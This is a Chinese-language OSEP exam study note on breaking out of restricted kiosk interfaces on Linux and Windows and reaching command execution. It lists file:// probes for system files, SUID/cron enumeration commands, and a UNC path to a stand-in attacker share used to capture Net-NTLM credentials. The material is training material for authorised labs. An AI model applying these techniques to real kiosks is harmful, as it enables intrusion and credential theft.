---
title: OSEP-12-Kiosk从受限UI到命令执行闭环
description: '12-Kiosk突破 | 05-Kiosk从受限UI到命令执行闭环'
pubDate: 2026-01-30T00:02:07+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
---

# Kiosk 从受限 UI 到命令执行闭环

## 这篇文档解决什么问题

Kiosk 场景的难点不是工具，而是“受限 UI 让你不知道还能碰哪里”。你看到的可能只是浏览器、单一应用、一个文件选择框或一个极简窗口，但系统底层仍然可能有：

- 文件系统。
- 协议处理器。
- 下载目录。
- 浏览器 Profile。
- 配置文件。
- 计划任务。
- 脚本解释器。
- 网络认证行为。

这篇文档按初学者视角，把 Kiosk 突破整理成：

```text
受限 UI
  -> 找可输入/可打开/可保存/可下载的位置
  -> 转成文件读写或网络请求
  -> 找可执行或可解释入口
  -> 获得命令执行
  -> 提权或提取凭证
```

只用于 OSEP 授权实验环境和考试备考。

---

## Kiosk 的本质

Kiosk 不是“没有操作系统”，而是把用户限制在很窄的交互界面里。

| 限制层 | 常见表现 | 你要找的突破点 |
|---|---|---|
| UI 限制 | 只能浏览网页、只能点固定按钮 | 地址栏、文件对话框、打印、帮助、下载 |
| 应用限制 | 只能运行浏览器或单一程序 | URI Scheme、插件、Profile、打开方式 |
| 文件限制 | 看不到文件系统 | `file://`、保存/另存为、上传控件 |
| 执行限制 | 没有终端或 cmd | 脚本解释器、配置加载点、计划任务 |
| 权限限制 | 普通用户或 kiosk 用户 | 可写目录、SUID、cron、服务配置 |

---

## 受限 UI 枚举顺序

### 第 1 步：列出所有可交互入口

不要一开始就尝试 payload。先记录界面里所有可以输入、打开、保存、上传、下载的位置。

| 入口 | 可能价值 |
|---|---|
| 地址栏 | `file://`、内部页、协议处理器 |
| 文件上传框 | 打开文件选择器、路径跳转 |
| 下载功能 | 控制落地文件位置 |
| 打印/另存为 PDF | 打开系统对话框 |
| 帮助/关于页面 | 打开外部链接或本地文档 |
| 书签/历史/下载记录 | 泄露内部路径和访问目标 |
| 右键菜单/快捷键 | 打开检查器、保存、复制路径 |

### 第 2 步：判断能否读文件

浏览器场景优先试：

```text
file:///
file:///C:/Windows/win.ini
file:///etc/passwd
```

注意：能读文件不等于能执行，但它可以帮助你找到用户名、配置、Profile、可写目录。

### 第 3 步：判断能否写文件

可写位置常见于：

| 系统 | 位置 |
|---|---|
| Windows | Downloads、Temp、Desktop、AppData |
| Linux | `/tmp`、用户 home、浏览器 profile、下载目录 |

写文件的价值取决于是否能触发：

- 用户打开。
- 浏览器加载。
- 脚本解释器执行。
- cron/计划任务读取。
- 配置文件被应用重载。

### 第 4 步：找可执行或可解释入口

| 入口 | 思路 |
|---|---|
| URI Scheme | 触发系统关联程序 |
| 文件关联 | 下载 `.html`、`.js`、`.hta`、脚本或配置 |
| 浏览器 Profile | 改配置、扩展、启动页、书签 |
| gtkdialog | Linux Kiosk 中用 XML 定义交互界面 |
| cron/计划任务 | 等待定时触发 |
| Windows shell 路径 | `shell:startup`、特殊目录 |

---

## Linux Kiosk 闭环

### 概念说明

Linux Kiosk 常见组合是浏览器、轻量窗口管理器、受限用户、Profile 和定时任务。

### 使用场景

- 只能访问浏览器。
- 能打开 `file://`。
- 能操作 Firefox Profile。
- 能写入用户目录或临时目录。
- 能发现 `gtkdialog`、cron、SUID 程序。

### 常用检查

如果已经有命令执行：

```bash
id
whoami
hostname
pwd
ls -la
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null | head
crontab -l 2>/dev/null
ls -la /etc/cron* 2>/dev/null
```

如果还没有命令执行，重点从 UI 查：

- Firefox Profile 路径。
- 下载目录。
- `file://` 访问能力。
- 是否能保存、上传、打开本地文件。
- 是否能触发外部程序。

### 注意事项

1. Kiosk 提权经常需要等待触发，例如 cron。
2. 没有终端时，可以通过写文件、HTTP 请求、DNS 请求证明命令执行。
3. Profile 修改不一定立即生效，可能需要重启浏览器或等待用户动作。
4. 权限提升前先保留 UI 突破证据，否则报告会断链。

---

## Windows Kiosk 闭环

### 概念说明

Windows Kiosk 常见突破面在文件对话框、特殊路径、协议处理器、快捷方式、UNC 和下载目录。

### 使用场景

- 只允许某个应用。
- 文件对话框能打开路径。
- 浏览器能下载文件。
- 可以访问 `shell:` 路径或 UNC。
- 能打开 Office、脚本宿主或系统工具。

### 常见路径和输入

```text
shell:startup
shell:appdata
shell:downloads
%TEMP%
%USERPROFILE%
\\ATTACKER\share
file:///C:/Windows/win.ini
```

### UNC 的价值

访问 `\\ATTACKER\share` 可能触发当前用户的 Net-NTLM 认证。它不一定直接给命令执行，但可以提供：

- 凭证捕获。
- 中继机会。
- 当前用户身份验证。
- 网络出站证据。

### 注意事项

1. Windows Kiosk 突破后要立刻判断 AppLocker/AMSI/AV。
2. 文件对话框能看到文件，不代表能执行程序。
3. `shell:` 路径依赖 Windows Shell 和策略配置。
4. UNC 触发的是认证行为，不等于拿到明文密码。

---

## 从“没有输出”到“证明执行”

Kiosk 经常没有正常 stdout。证明命令执行可以用这些方式：

| 方式 | 适用场景 |
|---|---|
| 写文件 | 能访问某个可写目录 |
| HTTP 请求 | 目标能出网到你的 Web 服务 |
| DNS 查询 | 只允许 DNS 出网 |
| 时间延迟 | 能观察 UI 卡顿或响应时间 |
| 创建可见文件 | 能通过文件对话框查看 |
| 反向连接 | 网络允许且防护不拦 |

先用最小命令证明执行，再考虑完整 shell。

---

## 排错表

| 现象 | 优先排查 |
|---|---|
| `file://` 被禁 | 上传/下载/打印/帮助/URI Scheme |
| 能读不能写 | 找下载目录、Profile、Temp |
| 能写不能执行 | 找解释器、配置加载点、计划任务 |
| 没有输出 | 写文件、HTTP/DNS 回连、时间延迟 |
| 反连失败 | 网络过滤、代理、AV、payload 架构 |
| 提权不触发 | cron/计划任务时间、路径权限、脚本格式 |
| UI 入口太少 | 快捷键、右键、浏览器内部页、错误页面 |

---

## OSEP 考试相关重点

1. Kiosk 的关键是把“受限 UI”转成“系统能力”。
2. 先证明读写和执行，再追求交互 shell。
3. Windows Kiosk 要联动 UNC、文件对话框、`shell:`、AppLocker。
4. Linux Kiosk 要联动 Profile、cron、SUID、共享库/脚本配置。
5. 报告要记录从 UI 到命令执行的每一步证据，不能只放最终 shell。

---

## 自检清单

- [ ] 我能列出当前 Kiosk UI 的所有输入、打开、保存、下载点。
- [ ] 我能判断自己是文件读取、文件写入，还是命令执行。
- [ ] 我知道没有输出时如何证明命令执行。
- [ ] 我能解释 UNC 触发认证和命令执行的区别。
- [ ] 我能把 Kiosk 突破接到凭证、网络过滤、AppLocker 或 Linux 后渗透章节。
